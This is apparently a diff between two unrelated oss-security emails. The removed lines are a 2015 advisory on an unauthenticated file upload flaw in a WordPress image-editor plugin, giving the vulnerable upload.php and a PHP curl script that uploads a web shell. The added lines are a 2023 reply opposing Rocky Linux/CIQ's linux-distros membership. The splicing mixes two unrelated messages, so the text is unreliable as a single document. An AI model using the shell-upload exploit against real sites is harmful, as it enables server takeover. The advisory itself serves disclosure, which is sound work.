@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4212" "Wednesday" "10" "June" "2015" "10:48:27" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<251ACF3F-8CEA-4A22-AB6E-35569598D2A0@me.com>" "103" "[oss-security] Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin" nil nil nil "6" "2015061014:48:27" "[oss-security] Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin" (number mark "        larry0@me.co Jun 10  103/4212  " thread-indent "\"[oss-security] Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 9545 invoked by uid 550); 10 Jun 2015 14:49:19 -0000
+Received: (qmail 1817 invoked by uid 550); 13 Oct 2023 12:13:25 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,125 +6,275 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9398 invoked from network); 10 Jun 2015 14:48:48 -0000
-X-Proofpoint-Virus-Version: vendor=fsecure
- engine=2.50.10432:5.14.151,1.0.33,0.0.0000
- definitions=2015-06-10_10:2015-06-10,2015-06-10,1970-01-01 signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
- reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506100243
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <251ACF3F-8CEA-4A22-AB6E-35569598D2A0@me.com>
-MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
-X-Mailer: Apple Mail (2.2098)
-Date: Wed, 10 Jun 2015 10:48:27 -0400
-From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Remote file upload vulnerability in
- aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin
-To: Open Source Security <oss-security@lists.openwall.com>
+Received: (qmail 7488 invoked from network); 13 Oct 2023 10:50:26 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1697194214; x=1697799014; darn=lists.openwall.com;
+        h=in-reply-to:subject:to:from:date:message-id:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=EEFhPTz93u5gZ8/Sebukn3wE0xwj1l4Z2qNIvfjWhn4=;
+        b=R9WDVHATHuPF3GK4QeqCbS9tQ6DFDtuFv8FEihnlRtfAeGhXzqkKcw6UOXMeCCIC8/
+         3NbljkfOKCQn7vD3liQhU8UCUWtyLYacVgdCqRahVE247GxxVMS6sKDK9yLoiSV8B2Te
+         6wP6qEU2VrV42YcrZzc7ZgJwLHLWYIJGd3WyZIjTOVViqDe0u5CwRNukmcW0HaIxab73
+         ctzpf0H+SYPnq+PmD7sH1NiO6kjFgQy8AqmdGIWGFhkrr7nJYBymQbBsadDuTqIyGBhg
+         uUxNNVzRFwiwFvPV6fnD8jEbHcSTYV8jEy/ICRf/jeNph2rGTKNhWqjlUSABrZAHQmOM
+         k/Ug==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1697194214; x=1697799014;
+        h=in-reply-to:subject:to:from:date:message-id:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=EEFhPTz93u5gZ8/Sebukn3wE0xwj1l4Z2qNIvfjWhn4=;
+        b=PUGIyy2I4iZQYD+crUjK18a+/M1Y+xW3zvUWodrmjI0fPOQbi/HhA4KGpGDOvVPubt
+         nvIWbD3lcD9/fMZv6Yob6NjfGce4gHnYqKVnQdr3BuG1ClHXnrJ4VMvqjalxYd8ZSF0S
+         MksHduKaOC6IDdyfZpHo1v+UjUVixPaq6Qcs+d3ajhGGQG5wiaB6Wv91riDTluNwvL5V
+         wkhojXoXBtr68bWiab3W/qmn/6gM0RBtliF0lwPpOw2oZU/+trzHkg3qL743XHrMr0/i
+         ApcJl95UGxOgLiDUANdApCwA1pQdsG6B2FurO7ottVXm1h6734ItyV23sjqZ0EZ5bk7i
+         j8aA==
+X-Gm-Message-State: AOJu0Yx7qdMK9owmgKxOss3mBldh77DPk6qq/psvs1QTPJCKpUsY6JkX
+	DQ9l+dl8wzfNur5Ibh29AZ6VZF5XpZke9T9y
+X-Google-Smtp-Source: AGHT+IFBlDKpStAvsA6OZyV0OfPmAwbQYjn3udk4H/9OsPLL4GLVC04YH7Z8xOPGbwzUcFiWEn1XOA==
+X-Received: by 2002:a05:622a:156:b0:413:5dbd:a926 with SMTP id v22-20020a05622a015600b004135dbda926mr35426355qtw.2.1697194213932;
+        Fri, 13 Oct 2023 03:50:13 -0700 (PDT)
+Message-ID: <652920e5.c80a0220.3bcf7.2251@mx.google.com>
+Date: Fri, 13 Oct 2023 03:50:13 -0700 (PDT)
+From: Neal Gompa <ngompa13@gmail.com>
+To: oss-security@lists.openwall.com
+In-Reply-To: <20231011135927.GA31034@openwall.com>
+Subject: Re: [oss-security] linux-distros list membership application - CIQ
+ Rocky Linux Security Team
 
-Title: Remote file upload vulnerability in aviary-image-editor-add-on-for-g=
-ravity-forms v3.0beta Wordpress plugin
-Author: Larry W. Cashdollar, @_larry0
-Date: 2015-06-07
-Download Site: https://wordpress.org/plugins/aviary-image-editor-add-on-for=
--gravity-forms
-Vendor: Waters Edge Web Design and NetherWorks LLC
-Vendor Notified: 2015-06-08
-Advisory: http://www.vapid.dhs.org/advisory.php?v=3D125
-Vendor Contact: plugins@wordpress.org
-Description: A plugin that integrates the awesome Adobe Creative SDK (forme=
-rly Aviary) Photo / Image Editor with the Gravity Forms Plugin.
-Vulnerability:
-There is a remote file upload vulnerability in aviary-image-editor-add-on-f=
-or-gravity-forms/includes/upload.php as an unauthenticated user can upload =
-any file to the system.  Including a .php file.  The upload.php doesn't che=
-ck that the user is authenticated and a simple post will allow arbitrary co=
-de to be uploaded to the server.
 
-In the file aviary-image-editor-add-on-for-gravity-forms/includes/upload.ph=
-p the code doesn=E2=80=99t check for an authenticated Wordpress user:
+On Wed, Oct 11, 2023 at 10:00 AM Solar Designer <solar@openwall.com> wrote:
+>
+> Hi,
+>
+> I'd appreciate others in here (especially "someone already on the
+> private list, or at least someone else who has been active on
+> oss-security for years but is not affiliated") helping review the
+> application below.  Normally, I'd just accept an application like this
+> based on it fitting the criteria (per my review) and lack of objections,
+> however for my own application it would be best to hear from others.
+>
+> Meanwhile, the Security SIG has started functioning and has been
+> announced on its own:
+>
+> https://rockylinux.org/pl/news/security-sig-update/
+> https://sig-security.rocky.page
+>
 
- 1 <?php
- 2=20
- 3 $filename =3D $_SERVER["DOCUMENT_ROOT"]."/wp-load.php";
- 4 if (file_exists($filename)) {
- 5     include_once($filename);
- 6 } else {
- 7     include_once("../../../../wp-load.php");
- 8 }
- 9 echo "Here";
-10 $image_file =3D $_FILES['gf_aviary_file'];
-11 if($image_file['name']!=3D''){
-12      $max_file_size =3D  4*1024*1024;
-13      $file_size =3D intval($image_file['size']);
-14      if( $file_size > $max_file_size ){
-15          $msg =3D "File Size is too big.";
-16          $error_flag =3D true;
-17      }
-18      $extension =3D strtolower(end(explode('.', $image_file['name'])));
-19      $aa_options =3D get_option('gf_aa_options');
-20      $supported_files =3D $aa_options['supported_file_format'];
-21      $supported_files =3D strtolower($supported_files);
-22      if(!$error_flag && $supported_files !=3D '' ){
-23        $supported_files =3D explode (',', $supported_files);
-24        if(!in_array($extension, $supported_files)){
-25           $msg =3D "No Supported file.";
-26           $error_flag =3D true;
-27        }
-28      }
-29      if(!$error_flag){
-30         $wp_upload_dir =3D wp_upload_dir();
-31         if(!is_dir($wp_upload_dir['basedir'].'/gform_aviary')){
-32              mkdir($wp_upload_dir['basedir'].'/gform_aviary');
-33         }
-34         $upload_dir =3D $wp_upload_dir['basedir'].'/gform_aviary/';
-35         $upload_url =3D $wp_upload_dir['baseurl'].'/gform_aviary/';
-36         $file_name =3D $upload_dir.$_POST['gf_aviary_field_id'].'_'.$ima=
-ge_file['name'    ];
-37         if(move_uploaded_file($image_file['tmp_name'], $file_name)){
-38             $file_url =3D $upload_url.$_POST['gf_aviary_field_id'].'_'.$=
-image_file['na    me'];
-39         }
-40     }
-41     $return_obj =3D array('status' =3D> 'success', 'message' =3D> $file_=
-url);
-42     echo json_encode($return_obj);
-43  }
-44 ?>
+While I have not been subscribed to this mailing list for long, I have
+"lurked" for a while as part of doing work in Fedora, Mageia, and
+openSUSE.
 
-CVEID: 2015-4455
-OSVDB:
-Exploit Code:
-	=E2=80=A2 <?php
-	=E2=80=A2 /*Remote shell upload exploit for aviary-image-editor-add-on-for=
--gravity-forms v3.0beta */
-	=E2=80=A2 /*Larry W. Cashdollar @_larry0
-	=E2=80=A2 6/7/2015
-	=E2=80=A2 shell will be located http://www.vapidlabs.com/wp-content/upload=
-s/gform_aviary/_shell.php
-	=E2=80=A2 */
-	=E2=80=A2=20=20
-	=E2=80=A2=20=20
-	=E2=80=A2        $target_url =3D 'http://www.vapidlabs.com/wp-content/plug=
-ins/aviary-image-editor-add-on-for-gravity-forms/includes/
-	=E2=80=A2 upload.php';
-	=E2=80=A2        $file_name_with_full_path =3D '/var/www/shell.php';
-	=E2=80=A2=20=20
-	=E2=80=A2        echo "POST to $target_url $file_name_with_full_path";
-	=E2=80=A2        $post =3D array('name' =3D> 'shell.php','gf_aviary_file'=
-=3D>'@'.$file_name_with_full_path);
-	=E2=80=A2=20=20
-	=E2=80=A2        $ch =3D curl_init();
-	=E2=80=A2        curl_setopt($ch, CURLOPT_URL,$target_url);
-	=E2=80=A2        curl_setopt($ch, CURLOPT_POST,1);
-	=E2=80=A2        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-	=E2=80=A2        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
-	=E2=80=A2        $result=3Dcurl_exec ($ch);
-	=E2=80=A2        curl_close ($ch);
-	=E2=80=A2        echo "<hr>";
-	=E2=80=A2        echo $result;
-	=E2=80=A2        echo "<hr>";
-	=E2=80=A2 ?>=
+Feel free to take my opinion with as much salt as you'd like, but I do
+not believe that Rocky Linux qualifies for it. My rationale is given
+inline below.
+
+>
+> On Sun, Oct 01, 2023 at 03:02:23PM +0200, Solar Designer wrote:
+> > Hi,
+> >
+> > Rocky Linux is a prominent Enterprise Linux distribution in the spirit
+> > of original goals of the CentOS project, founded by Gregory Kurtzer, who
+> > had also co-founded CentOS and is founder and CEO of the primary
+> > corporate sponsor of the Rocky Linux project, CIQ:
+> >
+> > https://rockylinux.org
+> > https://ciq.com
+> >
+> > Besides heavily sponsoring Rocky Linux (yet without being its owner),
+> > CIQ also has its own Open Source and commercial offerings:
+> >
+> > "Our software stack consists of Rocky Linux the CentOS replacement,
+> > Apptainer the container solution of choice for HPC, Warewulf a
+> > provisioning and cluster management solution, and Fuzzball our
+> > next-generation performance computing platform that is multi-cloud,
+> > multi-site, multi-cluster, and multi-node."
+> >
+> > Most relevant here, CIQ maintains LTS branches of Rocky Linux point
+> > releases (such as of 8.6 when current is 8.8), providing security
+> > updates to those of its customers who wish to otherwise stay at a given
+> > point release.
+> >
+> > Further, the Rocky Linux project isn't limited to being a resurrection
+> > of CentOS (its packages being bug-for-bug compatible with RHEL), but
+> > also has a number of Special Interest Groups (SIGs) offering additional
+> > package repositories:
+> >
+> > https://wiki.rockylinux.org/special_interest_groups/
+> >
+> > I have recently joined this effort and we're now getting the Security
+> > SIG going.  This means an optional repository of extra packages for
+> > Enterprise Linux distros adding security features and even overriding
+> > some packages with hardened alternatives.  We already have a few
+> > packages of both kinds, and many more are planned.  If anyone else wants
+> > to join this effort - in any capacity including development,
+> > maintenance, testing, documentation, or something else - let me know!
+> >
+> > This application is for CIQ Rocky Linux Security Team, which means CIQ
+> > employees, (sub)contractors, and/or Rocky Linux project contributors
+> > trusted and tasked with producing security updates for Rocky Linux,
+> > CIQ's LTS branches of Rocky Linux, and possibly CIQ's other offerings
+> > building upon Rocky Linux.
+> >
+> > I address the 9 membership criteria below:
+> >
+> > > Be an actively maintained Unix-like operating system distro with substantial use of Open Source components
+> >
+> > Rocky Linux has been actively maintained since its release in 2021, and
+> > is an Open Source project.  Many of CIQ's additional offerings are also
+> > Open Source projects on their own.
+> >
+> > > Have a userbase not limited to your own organization
+> >
+> > Rocky Linux has been publicly available since its release in 2021, and
+> > per EPEL repository access statistics has gained a userbase on par with
+> > other major EL distributions:
+> >
+> > https://ciq.com/blog/tracking-rocky-linux-growth-using-fedoras-epel-project/
+> > https://brentk.io/thoughts/analysis/epel-distribution-statistics.html
+> > https://rocky-stats.tiuxo.com
+> >
+> > Further, CIQ has its customer base for Rocky Linux support, including
+> > for the LTS branches.
+> >
+> > > Have a publicly verifiable track record, dating back at least 1 year and continuing to present day, of fixing security issues (including some that had been handled on (linux-)distros, meaning that membership would have been relevant to you) and releasing the fixes within 10 days (and preferably much less than that) of the issues being made public (if it takes you ages to fix an issue, your users wouldn't substantially benefit from the additional time, often around 7 days and sometimes up to 14 days, that list membership could give you)
+> >
+> > The publicly verifiable track record currently consists of timely
+> > rebuild and re-release of RHEL security update packages and security
+> > advisories, as published here:
+> >
+> > https://errata.rockylinux.org
+> >
+> > Not currently verifiable publicly, but Gregory further tells me:
+> >
+> > "We've been doing LTS privately to our customers for over a year now.
+> > This means we maintain security fixes for customers who need long term
+> > support for point releases."
+> >
+
+From my point of view, this does not count. Rocky's public track record
+of rebuilding RHEL updates and shipping them in a timely fashion does
+not indicate that Rocky/CIQ can respond effectively when you have a craft
+updates from scratch. Furthermore, there are public posts and articles
+indicating that Rocky Linux/CIQ has trouble with shipping updates in a
+timely fashion at all.
+
+Examples on updates:
+https://forums.rockylinux.org/t/some-errata-missing-in-comparison-with-rhel-and-almalinux/3843
+https://forums.rockylinux.org/t/rocky-linux-9-errata-missing-late-8-errata/6890
+https://forums.rockylinux.org/t/errata-rockylinux-org-not-updated-since-sep-02-2022/7676
+
+Example on releases: https://www.theregister.com/2022/07/18/rocky_linux_9/
+
+> > > Not be (only) downstream or a rebuild of another distro (or else we need convincing additional justification of how the list membership would enable you to release fixes sooner, presumably not relying on the upstream distro having released their fixes first?)
+> >
+> > Besides being a "downstream or a rebuild of another distro", CIQ has its
+> > LTS branches and Rocky Linux has its additional and replacement packages
+> > via the SIGs.  Security maintenance for these should be provided by CIQ
+> > and Rocky Linux.
+> >
+
+Special interest groups cannot count because they are intended to be
+public community projects. Unless you're saying that all Rocky Linux
+SIGs are shadows of CIQ work that can be held back for public consumption,
+that is effectively out of scope for consideration.
+
+Otherwise, Fedora and CentOS SIGs would be eligible for linux-distros@
+(and my understanding is that they are not).
+
+I will also note that CIQ/RESF/Rocky have made public statements about
+maintaining the pure-rebuild nature of the distribution, which I
+believe summarily disqualifies it.
+
+https://ciq.com/blog/rhel-changes-what-it-means-for-ciq/
+https://rockylinux.org/news/2023-06-22-press-release/
+https://rockylinux.org/news/brave-new-world-path-forward/
+https://rockylinux.org/news/keeping-open-source-open/
+
+> > Some security issues in upstream packages may be mitigated or fixed by
+> > pushing "security override" packages via CIQ's customer-facing repos and
+> > the Security SIG repos, without waiting on upstream distro's fixes and
+> > for issues or point releases where no upstream fixes are expected.
+> >
+> > Related previously accepted membership application (precedent) is
+> > CloudLinux's, which is now perhaps best known for AlmaLinux, another
+> > prominent EL distribution:
+> >
+> > http://www.openwall.com/lists/oss-security/2017/07/02/2
+> >
+
+CloudLinux's membership was based on the fact that they replaced and
+maintained a very large chunk of the distribution for their own
+purpose. They used a RHEL compatible userland, but most of the server
+software stacks and the kernel were replaced with their own builds.
+They wanted access for the maintenance of that stuff, which is very
+reasonable.
+
+Rocky/CIQ has not demonstrated a similar need from my point of view.
+
+> > Also, CentOS was once a member.
+> >
+
+CentOS was a very strange project in that it operated in a very closed
+fashion and it was difficult for volunteers to join the effort. I do
+not pretend to know if the current rules existed when CentOS was a
+member, but I would not accept them today on the basis that it's
+effectively a RHEL build.
+
+Fedora is not a member because there is no mechanism in the project to
+hide anything from the community. For this reason, I have not
+considered joining as a representative of CentOS Hyperscale, Mageia,
+or Fedora (all distributions that I do participate in security
+response for).
+
+> > > Be a participant and preferably an active contributor in relevant public communities (most notably, if you're not watching for issues being made public on oss-security, which are a superset of those that had been handled on (linux-)distros, then there's no valid reason for you to be on (linux-)distros)
+> >
+> > I have been a participant on oss-security since its inception, and have
+> > made relevant contributions.  Others with CIQ and Rocky Linux are also
+> > involved in various communities, and we'll ensure that the team to be
+> > subscribed to linux-distros isn't blind to publicly disclosed issues.
+> >
+> > > Accept the list policy
+> >
+> > CIQ Rocky Linux Security Team accepts the linux-distros list policy.
+> >
+> > > Be able and willing to contribute back, preferably in specific ways announced in advance (so that you're responsible for a specific area and so that we know what to expect from which member), and demonstrate actual contributions once you've been a member for a while
+> >
+> > I've been contributing to oss-security and linux-distros since their
+> > inception.  We'll also look for additional ways CIQ and/or Rocky Linux
+> > can contribute, depending on expertise, interests, other related duties,
+> > and availability of specific people we may add.
+> >
+> > > Be able and willing to handle PGP-encrypted e-mail
+> >
+> > Of course.  I am already subscribed with my PGP key.
+> >
+> > My current subscription is as list admin and it also was for Openwall.
+> > Openwall no longer qualifies for linux-distros membership as a distro
+> > since we've effectively EOL'ed the Openwall GNU/*/Linux distro (we still
+> > do maintain many other projects, but not a full distro).  However, I
+> > and/or someone else from Openwall would have needed to stay subscribed
+> > as list admin anyway.
+> >
+> > With my new Rocky Linux role, my subscription's purpose will once again
+> > double as list admin and for the distro.
+> >
+> > > Have someone already on the private list, or at least someone else who has been active on oss-security for years but is not affiliated with your distro nor your organization, vouch for at least one of the people requesting membership on behalf of your distro (then that one vouched-for person will be able to vouch for others on your team, in case you'd like multiple people subscribed)
+> >
+> > I suppose someone in here can vouch for me.  Please do - ideally, if you
+> > also have something else to say on this application in the same message,
+> > not to spam list members with messages solely to meet this formality.
+> >
+> > I may then get additional CIQ and/or Rocky Linux people subscribed,
+> > effectively vouching for them, after making sure they understand and
+> > accept the list policy.
+> >
+
+While I certainly recognize you and value your contributions
+over the years, I do not feel that you alone is sufficient for
+Rocky/CIQ to be accepted onto linux-distros@.
+
+
+--
+真実はいつも一つ！/ Always, there's only one truth!
